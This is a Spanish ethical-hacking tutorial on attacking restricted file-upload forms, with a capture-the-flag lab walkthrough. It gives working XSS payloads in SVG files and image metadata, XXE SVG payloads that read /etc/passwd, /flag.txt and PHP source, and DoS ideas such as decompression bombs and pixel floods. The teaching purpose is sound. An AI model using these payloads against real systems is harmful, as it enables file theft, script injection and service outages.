
# Cargas de archivos limitadas

Hasta ahora, nos hemos ocupado principalmente de eludir filtros para obtener cargas de archivos arbitrarias a través de una aplicación web vulnerable, que es el objetivo principal de este módulo en este nivel. Si bien los formularios de carga de archivos con filtros débiles se pueden explotar para cargar archivos arbitrarios, algunos formularios de carga tienen filtros seguros que pueden no ser explotables con las técnicas que analizamos. Sin embargo, incluso si estamos tratando con un formulario de carga de archivos limitado (es decir, no arbitrario), que solo nos permite cargar tipos de archivos específicos, aún podemos realizar algunos ataques a la aplicación web.

Ciertos tipos de archivos, como `SVG`, `HTML`, `XML` e incluso algunos archivos de imágenes y documentos, pueden permitirnos introducir nuevas vulnerabilidades en la aplicación web al cargar versiones maliciosas de estos archivos. Por eso, analizar las extensiones de archivo permitidas es un ejercicio importante para cualquier ataque de carga de archivos. Nos permite explorar qué ataques se pueden realizar en el servidor web. Por lo tanto, exploremos algunos de estos ataques.

***

## <mark style="color:purple;">XSS</mark>

Muchos tipos de archivos pueden permitirnos introducir una vulnerabilidad `XSS Stored` en la aplicación web al cargar versiones de ellos creadas con fines malintencionados.

El ejemplo más básico es cuando una aplicación web nos permite cargar archivos `HTML`. Aunque los archivos HTML no nos permiten ejecutar código (por ejemplo, PHP), aún sería posible implementar código JavaScript dentro de ellos para llevar a cabo un ataque XSS o CSRF contra quien visite la página HTML cargada. Si el objetivo ve un enlace de un sitio web en el que confía y el sitio web es vulnerable a la carga de documentos HTML, es posible engañarlo para que visite el enlace y llevar a cabo el ataque en sus máquinas.

Otro ejemplo de ataques XSS son las aplicaciones web que muestran los metadatos de una imagen después de su carga. Para dichas aplicaciones web, podemos incluir un payload XSS en uno de los parámetros de metadatos que aceptan texto sin formato, como los parámetros `Comment` o `Artist`, de la siguiente manera:

```shell-session
afsh4ck@kali$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' shell.jpg
afsh4ck@kali$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

Podemos ver que el parámetro `Comment` se actualizó a nuestro payload XSS. Cuando se muestran los metadatos de la imagen, se debe activar el payload XSS y se ejecutará el código JavaScript para realizar el ataque XSS. Además, si cambiamos el tipo MIME de la imagen a `text/html`, algunas aplicaciones web pueden mostrarla como un documento HTML en lugar de una imagen, en cuyo caso se activaría el payload XSS incluso si los metadatos no se mostraran directamente.

Por último, los ataques XSS también pueden llevarse a cabo con imágenes `SVG`, junto con varios otros ataques. Las imágenes `SVG (Scalable Vector Graphics)` se basan en XML y describen gráficos vectoriales 2D, que el navegador convierte en una imagen. Por este motivo, podemos modificar sus datos XML para incluir un payload XSS. Por ejemplo, podemos escribir lo siguiente en la imagen `shell.svg`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

Una vez que cargamos la imagen a la aplicación web, el payload XSS se activará cada vez que se muestre la imagen.

Para obtener más información sobre XSS, puede consultar el módulo [Cross-Site Scripting (XSS)](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/cross-site-scripting-xss.md).

***

## <mark style="color:purple;">XXE</mark>

Se pueden llevar a cabo ataques similares para explotar XXE. Los ataques `XXE (XML External Entity)` son un tipo de vulnerabilidad que ocurre cuando una aplicación que procesa datos XML permite la inclusión de entidades externas dentro de los documentos XML. Estos ataques se aprovechan de la capacidad de XML de definir entidades externas, que pueden referirse a archivos locales o recursos remotos, para realizar acciones no deseadas, como leer archivos del sistema, hacer solicitudes de red no autorizadas, o incluso ejecutar código malicioso.

Con imágenes SVG, también podemos incluir datos XML maliciosos para filtrar el código fuente de la aplicación web y otros documentos internos dentro del servidor. El siguiente ejemplo se puede utilizar para una imagen SVG que filtra el contenido de ( `/etc/passwd`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Una vez que se carga y visualiza la imagen SVG anterior, se procesa el documento XML y deberíamos obtener la información de ( `/etc/passwd`) impresa en la página o mostrada en la fuente de la página. De manera similar, si la aplicación web permite la carga de documentos `XML`, entonces el mismo payload puede llevar al mismo ataque cuando los datos XML se muestran en la aplicación web.

Si bien leer archivos de sistemas como `/etc/passwd` puede ser muy útil para la enumeración de servidores, puede tener un beneficio aún más significativo para las pruebas de penetración web, ya que nos permite leer los archivos fuente de la aplicación web. El acceso al código fuente nos permitirá encontrar más vulnerabilidades para explotar dentro de la aplicación web a través de pruebas de penetración White Box. Para la explotación de la carga de archivos, puede permitirnos `localizar el directorio de carga, identificar las extensiones permitidas o encontrar el esquema de nombres de archivos`, lo que puede resultar útil para una mayor explotación.

Para utilizar XXE para leer el código fuente en aplicaciones web PHP, podemos utilizar el siguiente payload en nuestra imagen SVG:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Una vez que se muestra la imagen SVG, deberíamos obtener el contenido codificado en base64 de `index.php`, que podemos decodificar para leer el código fuente. Para obtener más información sobre XXE, puede consultar el módulo [Ataques web .](https://academy.hackthebox.com/module/details/134)

El uso de datos XML no es exclusivo de las imágenes SVG, ya que también lo utilizan muchos tipos de documentos, como `PDF`, `Word`, `PowerPoint`, entre muchos otros. Todos estos documentos incluyen datos XML en su interior para especificar su formato y estructura. Supongamos que una aplicación web utiliza un visor de documentos que es vulnerable a XXE y permite cargar cualquiera de estos documentos. En ese caso, también podemos modificar sus datos XML para incluir los elementos XXE maliciosos y podríamos llevar a cabo un ataque Blind-XXE en el servidor web back-end.

Otro ataque similar que también se puede realizar a través de estos tipos de archivos es un ataque `SSRF`. Podemos utilizar la vulnerabilidad XXE para enumerar los servicios disponibles internamente o incluso llamar a API privadas para realizar acciones privadas.

***

## <mark style="color:purple;">DoS</mark>

Por último, muchas vulnerabilidades de carga de archivos pueden dar lugar a un `Denial of Service (DOS)` en el servidor web.

Además, podemos utilizar un tipo de archivo `Decompression Bomb` que utiliza compresión de datos, como los archivos `ZIP` comprimidos. Si una aplicación web descomprime automáticamente un archivo ZIP, es posible que cargue un archivo malicioso que contenga archivos ZIP anidados en su interior, lo que puede acabar generando muchos petabytes de datos y provocar un bloqueo en el servidor back-end.

Otro posible ataque DoS es un ataque `Pixel Flood` con algunos archivos de imagen que utilizan compresión de imágenes, como `JPG` o `PNG`. Podemos crear cualquier archivo de imagen `JPG` con cualquier tamaño de imagen (por ejemplo `500x500`), y luego modificar manualmente sus datos de compresión para indicar que tiene un tamaño de ( `0xffff x 0xffff`), lo que da como resultado una imagen con un tamaño percibido de `4 gigapíxeles`. Cuando la aplicación web intenta mostrar la imagen, intentará asignar toda su memoria a esta imagen, lo que provocará un bloqueo en el servidor back-end.

Además de estos ataques, podemos probar otros métodos para provocar un ataque DoS en el servidor back-end. Una forma de hacerlo es subir un archivo demasiado grande, ya que algunos formularios de carga pueden no limitar el tamaño del archivo de carga o comprobarlo antes de subirlo, lo que puede llenar el disco duro del servidor y hacer que se bloquee o se ralentice considerablemente.

Si la función de carga es vulnerable a Directory Traversal, también podemos intentar cargar archivos a un directorio diferente (por ejemplo, `../../../etc/passwd`), lo que también puede provocar que el servidor se bloquee

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 94.237.54.239:55944
```

### Pregunta 1

El ejercicio anterior contiene una función de carga que debería ser segura contra cargas de archivos arbitrarias. Intente explotarla utilizando uno de los ataques que se muestran en esta sección para leer "/flag.txt".

<figure><img src="/files/DJWoYD1NHyTZLqpiqKAs" alt=""><figcaption></figcaption></figure>

Al acceder nos encontramos con una web que solo permite la subida de logos en formato SVG.

Lo primero, vamos a descargarnos una imagen SVG legítima, para reescribir su contenido. Por ejemplo vamos a usar esta imagen, y la guardamos como `hacker.svg`:

{% embed url="<https://loading.io/icon/kuyet2>" %}

Si abrimos esta imagen con un editor de texto como gedit, podemos insertar un script de alerta que nos lance un popup, para probar si esta web es vulnerable:

```html
<script type="text/javascript">alert(window.origin);</script>
```

<figure><img src="/files/tzLEf5cD4H70MY7is0dB" alt=""><figcaption></figcaption></figure>

Vamos a subirlo a la web y ver que pasa. Efectivamente, nos lanza el popup, con lo que esta web es vulnerable a XSS.

<figure><img src="/files/DBnWxGHHIY4PhcMzJjCS" alt=""><figcaption></figcaption></figure>

Vamos a modificar el script para leer el contenido de la flag en el directorio raiz:

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>
```

Subimos este archivo y vemos lo que pasa:

<figure><img src="/files/DTljNEWoy7UFuVgim18B" alt=""><figcaption></figcaption></figure>

La imagen se queda con un espacio en blanco, ya que no hay contenido de imagen que mostrar. Pero si observamos el código fuente vemos que se ha inyectado el contenido del archivo `flag.txt`:

<figure><img src="/files/CnCGdcLoPvf9hwXfOTaW" alt=""><figcaption></figcaption></figure>

### Pregunta 2

Intente leer el código fuente de '`upload.php`' para identificar el directorio de cargas y use su nombre como respuesta. (escríbalo exactamente como se encuentra en la fuente, sin comillas)

De igual manera, podemos usar el siguiente SVG para leer el código fuente de upload.php:

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

Al cargar el archivo y ver el código fuente, vemos que se ha inyectado el código fuente de upload.php codificado en base64:

```html
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Employee File Manager</title>
  <link rel="stylesheet" href="./style.css">
</head>

<body>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
  <script src="./script.js"></script>
  <div>
    <h1>Update your logo</h1>
    <center>
      <form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm">
        <input type="file" name="uploadFile" id="uploadFile" accept=".svg">
        <svg>PD9waHAKJHRhcmdldF9kaXIgPSAiLi9pbWFnZXMvIjsKJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1sidXBsb2FkRmlsZSJdWyJuYW1lIl0pOwokdGFyZ2V0X2ZpbGUgPSAkdGFyZ2V0X2RpciAuICRmaWxlTmFtZTsKJGNvbnRlbnRUeXBlID0gJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0eXBlJ107CiRNSU1FdHlwZSA9IG1pbWVfY29udGVudF90eXBlKCRfRklMRVNbJ3VwbG9hZEZpbGUnXVsndG1wX25hbWUnXSk7CgppZiAoIXByZWdfbWF0Y2goJy9eLipcLnN2ZyQvJywgJGZpbGVOYW1lKSkgewogICAgZWNobyAiT25seSBTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9Cgpmb3JlYWNoIChhcnJheSgkY29udGVudFR5cGUsICRNSU1FdHlwZSkgYXMgJHR5cGUpIHsKICAgIGlmICghaW5fYXJyYXkoJHR5cGUsIGFycmF5KCdpbWFnZS9zdmcreG1sJykpKSB7CiAgICAgICAgZWNobyAiT25seSBTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgICAgICBkaWUoKTsKICAgIH0KfQoKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgICRsYXRlc3QgPSBmb3BlbigkdGFyZ2V0X2RpciAuICJsYXRlc3QueG1sIiwgInciKTsKICAgIGZ3cml0ZSgkbGF0ZXN0LCBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSkpOwogICAgZmNsb3NlKCRsYXRlc3QpOwogICAgZWNobyAiRmlsZSBzdWNjZXNzZnVsbHkgdXBsb2FkZWQiOwp9IGVsc2UgewogICAgZWNobyAiRmlsZSBmYWlsZWQgdG8gdXBsb2FkIjsKfQo=</svg>        <input type="submit" value="Upload" id="submit">
      </form>
    </center>
  </div>
</body>

</html>
```

Para decodificar este texto en base64 podemos usar [Cyberchef](https://gchq.github.io/CyberChef/), lo que nos devuelve el código fuente completamente decodificado, y obtenemos el nombre del directorio donde se cargan las imágenes:

<figure><img src="/files/ON8SvsH3WVsOkszvnbY5" alt=""><figcaption></figcaption></figure>

Concretamente vemos que se cargan en el directorio `./images/`
